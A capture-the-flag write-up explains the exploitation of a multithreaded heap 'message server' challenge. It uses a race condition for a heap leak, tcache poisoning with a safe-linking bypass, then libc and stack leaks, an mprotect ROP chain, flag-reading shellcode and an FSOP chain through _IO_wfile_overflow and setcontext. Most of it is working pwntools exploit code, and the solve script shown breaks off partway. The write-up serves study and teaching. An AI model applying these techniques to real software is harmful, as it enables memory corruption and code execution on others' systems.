# Race condition and tcache poisoning

Here I am sharing a very interesting challenge that involves race condition and tcache poisoning (an easy heap attack)

# Vulnerability

Let's dive right into the vulnerability of the binary file. First thing first, here are the simplified source code:

```c
void *handle_connection(void *fd) {
    FILE *in = fdopen((long)fd, "r");
    FILE *out = fdopen((long)fd, "w");
    setvbuf(in, NULL, _IONBF, 0);
    setvbuf(out, NULL, _IONBF, 1);

    fprintf(stderr, "Handling connection on FD %d\n", (int)fd);
    vuln(in, out);
    fprintf(stderr, "Closing connection on FD %d\n", (int)fd);

    close((long)fd);
    pthread_exit(0);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(1337);
    bind(server_fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    listen(server_fd, 4096);

    while (1) {
        pthread_t thread;
        long connection_fd = accept(server_fd, NULL, NULL);
        pthread_create(&thread, NULL, handle_connection, (void *)connection_fd);
    }
}

```
the above presents a multi-threaded TCP server which allows multiple connections to it at the same time. If you do not know what a multi-threaded server is, that is ok, because I also am not very sure lol. I only know that it handles multiple threads (like processes) at the same time.

Below is the vulnerable main function that would be run in each threads. Since the original source code decompiled by ghidra is overwhelmingly complicated to read, here is a simplified version that is good enough for us to understand the vulnerability.
```c
char *messages[16] = { 0 };
int stored[16] = { 0 };

void vuln(FILE *in, FILE *out) {
    fprintf(out, "Welcome to the message server! Commands: malloc/scanf/printf/free/quit.\n");
    char input[1024];
    int idx;

    while (1)
    {
        if (fscanf(in, "%s", input) == EOF) break;
        if (strcmp(input, "quit") == 0) break;
        if (fscanf(in, "%d", &idx) == EOF) break;

        if (strcmp(input, "printf") == 0) {
            if (fprintf(out, "MESSAGE: %s\n", stored[idx] ? messages[idx] : "NONE") < 0) break;
        }
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
        else if (strcmp(input, "scanf") == 0) {
            fscanf(in, "%1024s", stored[idx] ? messages[idx] : input);
        }
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
        else fprintf(stderr, "INVALID COMMAND %s %#llx\n", input, *(unsigned long long*)input);
    }
}
```
Actually, if it is a single threaded process, the above function would be secure. It is only vulnerable in the context that it is a multi-threaded program. 

Why? 

because of race condition, we are able to leak a heap address, perform tcache poisoning to do arbitrary read and write.

## What is a race condition and how it matters in above program

Race condition is about processes, programs, or instructions getting mixed up in an order that allows us to perform a malicious sequence of operations

Using the above program as example:

when we run the following in terminal, each operations are supposed to run in a normal sequence
```
$ nc localhost 1337
Welcome to the message server! Commands: malloc/scanf/printf/free/quit.

malloc 0 // 0 is the index of a heap chunk, so that we can access it later 

scanf 0 AAAA // editing the chunk

free 0 // delete the chunk

printf 0 // print the content of the chunk 
```
they should be running in a sequence like:
```
malloc --> scanf --> free --> printf
```
and since we deleted the chunk before printing its content, it should output `MESSAGE: NONE`

However, if we create the following 2 loops and keeps them running **AT THE SAME TIME**:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```
Then, the ordering of the operations would differ, which we could get:
```
malloc --> scanf --> printf --> free 

malloc --> printf --> scanf --> free 

printf --> malloc --> scanf --> free

etc.
```

So that's the basic idea of race condition, so how does this help in our exploit?
Let's take a closer look into the `free` and `printf` operation

Under `free`, we have:
```
if (stored[idx]) 
	free(messages[idx]);

stored[idx] = 0;
```
We can see that it carefully checks whether `stored[idx]` is already 0 before freeing to protect against double free. And setting it to 0 after freeing to protect against use-after-free. So there are 2 operations inside `free` operation:

```
free --> stored[idx] = 0
```

and in inside of a `printf("%s", a)` function, there are also various instructions, for example:
```
strlen(a) --> ?? --> ?? --> write(1, a, length)
```

Since this is a multi-threaded process, we can run two threads and thus two loops at the same time, like the example loop I mentioned above:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```

and ideally, we would like to see the a few operations mixed up in the following sequences, where `printf 0` is broken down into `strlen(a)` and `write(1, a, length)` and being mixed with free

```
strlen(a) --> free 0 --> write(1, a, length) --> stored[0] = 0
```

thus, we can bypass the protection in `free` operation and print something inside a freed chunk, likely a **heap address**. So we get a heap address with the following python exploit code that uses the idea I went through above:

```py
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0
```


# tcache poisoning

after getting a heap address leak, we can break safe-linking perform tcache poisoning! I will now explain what safe-linking and tcache poisoning are.

First of all, what is a tcachebin?

tcachebin is like one of the type of rubbish bin in heap. It is where the `freed` aka deleted chunks go into. And it supports a `FILO` (First in Last Out) mechanism. And the chunks would have a `next pointer` or `foward pointer` which points to the chunk that is `freed` just a moment earlier before it.

For example, if we do:
```
malloc 0
malloc 1
free 1
free 0
```
Then the tcachebin would becomes:
```
[0x410] chunk 0 --> chunk 1
```
The inside of chunk 0 would look like:
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```

The most important thing you need to know here is that chunk 0 carries an address that points to chunk 1. That is also why tcachebin looks like this:
```
[0x410] chunk 0 --> chunk 1
```
By the way, `[0x410]` is the size slot representing the size of the freed chunks. Chunks that are linked together (one points to the other) must be within same size slot.

And when we malloc chunk of sizes the same as chunk 0 and chunk 1 in tcachebin, the first malloc gets chunk 0 and the second malloc gets chunk 1 (`FILO`). Therefore:
```
malloc 0
malloc 1
free 1
free 0
malloc 2 // gets chunk 0 in tcache
malloc 100 // gets chunk 1 in tcache
```
Note that `2` and `100` above is just an index we later use to access that specific chunk, it's not the chunk size.

we can see from the simplified source code that, the size we malloc is always `1024`, so as long as tcachebin is not full (maximum size of a size slot is 7), they will always be going in and out from tcachebin
```
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
```

Now let's go back to this:

```
[0x410] chunk 0 --> chunk 1
```
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```

So now that you know the basic structure of tcachebin, we can talk about tcache poisoning. 
So tcache poisoning just means we change to address that chunk 0 points to, so it becomes something like:
```
[0x410] chunk 0 --> <arbitrary address>
```
The reason why we do this is because we can a chunk to be malloc'd at `<arbirary address>`, then we can either leak or modify the content of that address.

That's it, that's tcache poisoning!

But here one more thing, `<arbitrary address>` is not really arbitrary addresses. Because of safe-linking, the address has to be ending with a `0` bit. For example, `0x7267d80008a0` would work but `0x7267d80008a8` wouldn't work! Here I will talk a bit more about safe-linking. Safe-linking is a protection to tcachebin that the `foward pointers` in tachebins are mangled with the heap base address of the chunk that stores the forward pointers using XOR. What exactly does it mean

Let's take a look at this example:
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```
here the stored forward of chunk 0 :`<address of chunk 1>`, because of safe-linking, is not the actual address of chunk 1. It is actually: 
```
<actual address of chunk 1> ^ <base address of chunk 0>
```
So for example, if the address of chunk 1 (where chunk 0 points to) is `0x7267d80008a0`, and that base address of chunk 0 is `0x7267d8005`. Then the stored address would be `0x7267d80008a0 ^ 0x7267d8005 = 0x7260fe7d88a5`.

What I mean by base address is the an address being right shifted by 12 bits. For example: `0x7267d8005xxx >> 12 = 0x7267d8005`

SO that's it, that's all about safe-linking and tcache poisoning.

If unfortunately you do not understand safe-linking, it is not that important, it is just a protection that we need to bypass. We can still move on to the stuff below

But if you do not understand tcache poisoning, perhaps you need to re-read the above or free feel to ask me!
## How to apply tcache poisoning in this challenge

SO if you understand what I have been yapping above. You will know that tcache poisoning requires to edit the content of a `freed` chunk. Which is a use-after-free vulnerability

Let's recall what the program does:
```
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
```
the program has protection against use-after-free, using a `stored[idx]` to track the state of the chunks.

So again, we need to make use of race condition to bypass this. 

But this time we would race `scanf` operation against to `free` operation, so the flow we want to achieve is below:
```
free 0 --> scanf 0 <content> --> stored[0] = 0
```
We want `scanf` operation to be fit between `free` and the modification of `stored[0]`

The following would be able to achieve this:
```py
def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	r1.clean()
	r2.clean()
	
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #

		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break

	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	#if debug:
	#	gdb.attach(p, s)
	#	print(f"{idx}")
	#	r1.interactive()
	r1.sendline(f"free 0".encode()) # free the chunk so we can reuse it later, so that the base address of 0 never changes
	r1.clean()
	idx += 1
```


With the above, `chunk {idx}` would be the chunk we get on our second malloc and its address would be on a desired address we want, if you don't know what I am talking about, recall this:
```
[0x410] chunk 0 --> <arbitrary address>
```

Once we can control our allocations to arbitrary addresses, we can do arbitrary read and write. 


To arbitrarily read, we just need to `printf` the content of that "chunk" we malloc'd:
```
def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	
	r1.sendline(f"printf {idx - 1}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	return leak
```
To arbitrarily write, we just need to `scanf` and inject payload to that "chunk" we malloc'd:
```
def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	if debug:
		gdb.attach(p, s)
		pause()
		r1.sendline(f"scanf {idx - 1}".encode())
		r1.sendline(content)
		r1.interactive()
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
#	r1.interactive()
```

# Playing with programs with arbitrary read and write primitives

## Arbitrary read
Once we get arbitrary read and write primitives, we can finally have real fun with the program. 


My plan was to
Use arbitrary read to get:
```
1. libc leak for ROP chain
2. a random leak to get a stack leak (because only around that region we can get a stack address)
3. stack leak to write our ROP chain on the stack
```
Actual code:
```
		location1 = ((leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
```
from offset `+0x8a0` on the `leak` (which is the heap base address we got from `leak_tcache`) it contains a libc address. I know this by doing this in pwndbg:
```
pwndbg> p2p anon_73415c000 lib
pwndbg> p2p anon_73415c000 lib
00:0000│  0x73415c0008a0 —▸ 0x734161619c80 ◂— 0
00:0000│  0x73415c000bd8 —▸ 0x73416161a6a0 (_IO_2_1_stderr_) ◂— 0xfbad2086
00:0000│  0x73415c000c48 —▸ 0x734161616600 (_IO_file_jumps) ◂— 0
00:0000│  0x73415c000d40 —▸ 0x7341616160c0 (_IO_wfile_jumps) ◂— 0
pwndbg> 

```
the command `p2p`, which possibly means `pointer to pointer` (I am not sure)
```
p2p <region 1> <region 2>
```

it searches through region 1 to find a pointer that points to region 2

In the above example, `anon_73415c000` is the heap region of a thread (where our leaked heap base address lies in). And `lib` is the `libc` region:
```
    0x734161400000     0x734161428000 r--p    28000      0 /challenge/lib/libc.so.6
    0x734161428000     0x7341615bd000 r-xp   195000  28000 /challenge/lib/libc.so.6
    0x7341615bd000     0x734161615000 r--p    58000 1bd000 /challenge/lib/libc.so.6
    0x734161615000     0x734161619000 r--p     4000 214000 /challenge/lib/libc.so.6
    0x734161619000     0x73416161b000 rw-p     2000 218000 /challenge/lib/libc.so.6
```
Therefore, I know for a fact that a offset `+0x8a0` from the heap base, it points to a libc address:
```
00:0000│  0x73415c0008a0 —▸ 0x734161619c80 ◂— 0
```
Therefore, I do:
```
		location1 = ((leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
```

Similarly, I find all my other leaks via this way of searching and pivoting around the memory:
```
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak, 0, p, s) # pivot 
		
		location3 = leak3 - 0x250
		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, p, s)
		print("stack_leak: ", hex(stack_leak))
	
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		pop_rdi = libc_base + 0x000000000002a3e5 # rop chain
		pop_rsi = libc_base + 0x000000000002be51 # rop chain
		pop_rdx = libc_base + 0x00000000000796a2 # rop chain
		
		libc = p.elf.libc
		random_pointer = stack_leak - 0xd80	
		contains_IO_wfile_overflow = libc_base + 0x2160d8 # fsop
		mprotect_addr = libc_base + libc.symbols['mprotect'] # rop chain
		
		
		shellcode_addr = (leak << 12) + 0x2000 # rop chain
		fake_wide_data_addr = ((leak & ~0xff) << 12) + 0x1000 # fsop 
		_IO_2_1_stdout_ = ((leak & ~0xff) << 12) + 0xd50 # fsop 
		setcontext = libc_base + 0x539e0 + 61 # fsop
```

## Arbitrary write

Here are the arbitrary writes I used to pwn this binary:
```
		arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
		
		arbitrary_write(r1, r2, fake_wide_data_addr, leak, fake_wide_data, 0, p, s)
		
		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
```

### first arbitrary write
```
arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
```

So my `payload` contains a ROP chain together with shellcode, where I used ROP chain to call `mprotect` to make the region where I placed my ROP chain and shellcode as a `rwx` region and then immediately jump to my shellcode:

and `shellcode_addr` (appeared in my arbirary reads above) is where I place my ROP chain and shellcode:
```
shellcode = asm('''
		    /* Open the file */
		    push 257
		    pop rax
		    mov rdi, -100       /* dirfd: AT_FDCWD */
		    lea rsi, [rip+flag]
		    xor edx, edx        /* flags: O_RDONLY */
		    syscall

		    /* Read and write in one step */
		    push rax
		    pop rdi
		    xor eax, eax        /* syscall: read */
		    sub rsp, 64         /* smaller buffer */
		    mov rsi, rsp        /* buffer address */
		    mov rdx, 64         /* buffer size */
		    syscall
		    
		    /* Write to stdout */
		    push rax
		    pop rdx
		    mov rax, 1          /* syscall: write */
		    mov rdi, 1          /* fd: stdout */
		    /* rsi already points to our buffer */
		    syscall

		flag:
		    .string "/flag" 

		''')
			
		
		print("shellcode address: ", hex(shellcode_addr))
		
		# mprotect(shellcode_addr, 0x1000, 7)
		rop_chain = b""          
		rop_chain += p64(shellcode_addr)   # region of the shellcode addr and rop chain 
		rop_chain += p64(pop_rsi)            
		rop_chain += p64(0x1000)            
		rop_chain += p64(pop_rdx)          
		rop_chain += p64(7)                 # rwx 
		rop_chain += p64(mprotect_addr)     # jump to mprotect in libc
		payload = rop_chain + p64(shellcode_addr + len(rop_chain) + 8) + shellcode # jump to our shellcode
```

I am doing this because there's a badchar, which is whitespace character: `badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"` in the address of `system` as `fscanf` (the scanf that the binary uses) would stop reading our payload when it encounter a whitespace, so we cannot directly get a shell with a simple `ret2libc`.

### second and last arbitrary write
```
arbitrary_write(r1, r2, fake_wide_data_addr, leak, fake_wide_data, 0, p, s)
arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
```

in this arbitrary write, I am doing a `fsop` (file stream oriented programming)
```
		fsop_payload = b'\x00' * 0x78
		fsop_payload += p64(0) # 0x78
		fsop_payload += p64(0) # 0x80
		fsop_payload += p64(random_pointer - 8)  # 88
		fsop_payload += b'\x41' * 0x10  
		fsop_payload += p64(fake_wide_data_addr)  
		# setting up rsp
		fsop_payload += b'\x41' * 0x8
		fsop_payload += p64(shellcode_addr)# nvm this can be anything
		fsop_payload += p64(pop_rdi) # nvm this can be anything
		fsop_payload += p64(0xffffffffffffffff) 
		fsop_payload += b'\x41' * 0x8
		fsop_payload += b'\x41' * 0x8
		fsop_payload += p64(contains_IO_wfile_overflow - 0x38) #0xd8
```

which I first am overwriting the `_IO_wfile_jumps` which is at offset `0xe0` from any file struct to another jump target that would jump to `_IO_wfile_overflow` (`contains_IO_wfile_overflow`) which would then jump to `_IO_wdoallocbuf` and then jumps to `_wide_data` which the pointer at offset `0xa0` ( points to the fake_wide_data struct that I have created earlier:
```
		fake_wide_data = b'\x00' * 0x20
		fake_wide_data += p64(random_pointer)
		fake_wide_data += b'\x00' * 0x40
		fake_wide_data += p64(setcontext) #0x68
		fake_wide_data += p64(0) # 0x70
		fake_wide_data += p64(0) # 0x78
		fake_wide_data += p64(0) # 0x79
		fake_wide_data += p64(0) # 0x80
		fake_wide_data += p64(0) # 0x90
		fake_wide_data += p64(0) # 0x98
		fake_wide_data += p64(shellcode_addr) # 0xa0 rsp would be set to this in setcontext
		fake_wide_data += p64(pop_rdi) # 0xa8 rcx would be set to this in setcontext and then it would push rcx onto the top of the stack
		fake_wide_data += p64(0) # 0xb0
		fake_wide_data += p64(0) # 0xb8
		fake_wide_data += p64(0) # 0xc0
		fake_wide_data += p64(0) # 0xc8
		fake_wide_data += p64(0) # 0xd0
		fake_wide_data += p64(0) # 0xd8	
		fake_wide_data += p64(fake_wide_data_addr) 
```

And once we are `_IO_wdoallocbuf`, we will be playing with the `fake_wide_data` we created earlier. Specifically, it would first jump to pointer at offset `0xe0`, which is:
```
fake_wide_data += p64(fake_wide_data_addr)
```
and then it would jump to offset `0x68` which is setcontext+61
```
fake_wide_data += p64(setcontext) #0x68
```
And then `setcontext+61` would then basically do a set up for stack pivot using offset `0xa0` and offset `0xa8` on `fake_wide_data`:
```
		fake_wide_data += p64(shellcode_addr) # 0xa0 rsp would be set to this in setcontext
		fake_wide_data += p64(pop_rdi) # 0xa8 rcx would be set to this in setcontext and then it would push rcx onto the top of the stack
```
once the stack pivot is finished, we would then be jumping to our ROP chain at 
```
p64(pop_rdi) --> p64(shellcode_addr)
```

lastly, we do a `r1.sendline(b"send_flag w")` so that it would call `fwrite` and trigger `fsop`, jumps to rop chain, eventually jumping to shellcode. Because in the original source code, not the simplifed one, it looks like this:

```
            iVar3 = strcmp(local_428,"send_flag");
            if (iVar3 == 0) {
              fwrite("Secret: ",1,8,*(FILE **)(in_FS_OFFSET + -8));
```


# Challenge function of orginal source:
```

void challenge(void)

{
  uint uVar1;
  char cVar2;
  int iVar3;
  undefined *puVar4;
  void *pvVar5;
  char *pcVar6;
  long in_FS_OFFSET;
  uint local_440;
  int local_43c;
  uint local_438;
  uint local_434;
  void *local_430;
  char local_428 [1032];
  undefined8 local_20;
  
  local_20 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fwrite("Welcome to the message server!\n",1,0x1f,*(FILE **)(in_FS_OFFSET + -8));
  fwrite("Commands: malloc/free/scanf/printf/send_flag/quit.\n",1,0x33,*(FILE **)(in_FS_OFFSET + -8)
        );
  for (local_43c = 0; local_43c < 8; local_43c = local_43c + 1) {
    local_430 = malloc(0x400);
  }
  free(local_430);
  local_430 = malloc(9);
  fwrite("Storing the secret in this thread\'s heap.\n",1,0x2a,*(FILE **)(in_FS_OFFSET + -8));
  load_secret(local_430);
  do {
    while( true ) {
      iVar3 = __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),"%1024s",local_428);
      if (iVar3 == -1) goto LAB_0010214c;
      iVar3 = strcmp(local_428,"printf");
      if (iVar3 == 0) break;
      iVar3 = strcmp(local_428,"malloc");
      if (iVar3 == 0) {
        iVar3 = __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),&DAT_001031d9,&local_440);
        if (iVar3 == -1) goto LAB_0010214c;
        if (rand_size == 0xffffffff) {
          rand_size = 8;
        }
        iVar3 = rand_r(&rand_size);
        rand_size = iVar3 % 0x4000;
        for (local_438 = 0; (int)local_438 < 1; local_438 = local_438 + 1) {
          fprintf(*(FILE **)(in_FS_OFFSET + -8),
                  "Performing surprise malloc %d for index %d of size 0x%x\n",(ulong)local_438,
                  (ulong)local_440,(ulong)rand_size);
          uVar1 = local_440;
          pvVar5 = malloc((long)(int)rand_size);
          *(void **)(surprise + ((long)(int)uVar1 * 3 + (long)(int)local_438) * 8) = pvVar5;
          iVar3 = rand_r(&rand_size);
          rand_size = iVar3 % 0x10000;
        }
        fwrite("Performing your requested malloc\n",1,0x21,*(FILE **)(in_FS_OFFSET + -8));
        uVar1 = local_440;
        if (*(int *)(stored + (long)(int)local_440 * 4) == 0) {
          pvVar5 = malloc(0x400);
          *(void **)(messages + (long)(int)uVar1 * 8) = pvVar5;
        }
        *(undefined4 *)(stored + (long)(int)local_440 * 4) = 1;
      }
      else {
        iVar3 = strcmp(local_428,"scanf");
        if (iVar3 == 0) {
          iVar3 = __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),&DAT_001031d9,&local_440);
          if (iVar3 == -1) goto LAB_0010214c;
          if (*(int *)(stored + (long)(int)local_440 * 4) == 0) {
            pcVar6 = local_428;
          }
          else {
            pcVar6 = *(char **)(messages + (long)(int)local_440 * 8);
          }
          __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),"%1024s",pcVar6);
        }
        else {
          iVar3 = strcmp(local_428,"free");
          if (iVar3 == 0) {
            iVar3 = __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),&DAT_001031d9,&local_440);
            if (iVar3 == -1) goto LAB_0010214c;
            if (*(int *)(stored + (long)(int)local_440 * 4) != 0) {
              free(*(void **)(messages + (long)(int)local_440 * 8));
              for (local_434 = 0; (int)local_434 < 3; local_434 = local_434 + 1) {
                fprintf(*(FILE **)(in_FS_OFFSET + -8),"Freeing surprise malloc %d from index %d\n",
                        (ulong)local_434,(ulong)local_440);
                free(*(void **)(surprise + ((long)(int)local_440 * 3 + (long)(int)local_434) * 8));
              }
            }
            *(undefined4 *)(stored + (long)(int)local_440 * 4) = 0;
          }
          else {
            iVar3 = strcmp(local_428,"send_flag");
            if (iVar3 == 0) {
              fwrite("Secret: ",1,8,*(FILE **)(in_FS_OFFSET + -8));
              __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),"%1024s",local_428);
              cVar2 = secret_correct(local_428);
              if (cVar2 == '\0') {
                fwrite("Not authorized!\n",1,0x10,*(FILE **)(in_FS_OFFSET + -8));
              }
              else {
                fwrite("Authorized!\n",1,0xc,*(FILE **)(in_FS_OFFSET + -8));
                win();
              }
            }
            else {
              iVar3 = strcmp(local_428,"quit");
              if (iVar3 == 0) goto LAB_0010214c;
              fwrite("Unrecognized choice!\n",1,0x15,*(FILE **)(in_FS_OFFSET + -8));
            }
          }
        }
      }
    }
    iVar3 = __isoc99_fscanf(*(undefined8 *)(in_FS_OFFSET + -0x10),&DAT_001031d9,&local_440);
    if (iVar3 == -1) break;
    if (*(int *)(stored + (long)(int)local_440 * 4) == 0) {
      puVar4 = &DAT_001031dc;
    }
    else {
      puVar4 = *(undefined **)(messages + (long)(int)local_440 * 8);
    }
    iVar3 = fprintf(*(FILE **)(in_FS_OFFSET + -8),"MESSAGE: %s\n",puVar4);
  } while (-1 < iVar3);
LAB_0010214c:
  fclose(*(FILE **)(in_FS_OFFSET + -0x10));
  fclose(*(FILE **)(in_FS_OFFSET + -8));
                    /* WARNING: Subroutine does not return */
  pthread_exit((void *)0x0);
}


```

# Entirety of my solve script:
```py
import time 
from pwn import *
import os

idx = 1

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	r1.clean()
	r2.clean()
	
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #

		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break

	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	#if debug:
	#	gdb.attach(p, s)
	#	print(f"{idx}")
	#	r1.interactive()
	r1.sendline(f"free 0".encode()) # free the chunk so we can reuse it later, so that the base address of 0 never changes
	r1.clean()
	idx += 1

def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	
	r1.sendline(f"printf {idx - 1}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	if debug:
		gdb.attach(p, s)
		pause()
		r1.sendline(f"scanf {idx - 1}".encode())
		r1.sendline(content)
		r1.interactive()
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
#	r1.interactive()
	
	
	
def exploit(r1, r2, p):
	s = '''
	set $mybase = (unsigned long)&challenge - 0x1a64
	b * $mybase + 0x1c43
	b * $mybase + 0x020eb
	b * $mybase + 0x02158
	b * $mybase + 0x01e68
	b * $mybase + 0x02058
	b * fwrite
	b * fwrite+71
	b * fwrite+189 
	b * setcontext+61
	b * _IO_wfile_overflow
	b * _IO_2_1_stdout_

	
	'''
	
	leak = leak_tcache(r1, r2)
	
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		# pivoting around memory, so we need to leak many times
		
		location1 = ((leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
				
		print("libc leak leak: ", hex(libc_leak))
		
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak, 0, p, s) # pivot 
		
		location3 = leak3 - 0x250
		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, p, s)
		print("stack_leak: ", hex(stack_leak))
	
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		pop_rdi = libc_base + 0x000000000002a3e5 # rop chain
		pop_rsi = libc_base + 0x000000000002be51 # rop chain
		pop_rdx = libc_base + 0x00000000000796a2 # rop chain
		
		libc = p.elf.libc
		random_pointer = stack_leak - 0xd80	
		contains_IO_wfile_overflow = libc_base + 0x2160d8 # fsop
		mprotect_addr = libc_base + libc.symbols['mprotect'] # rop chain
		
		
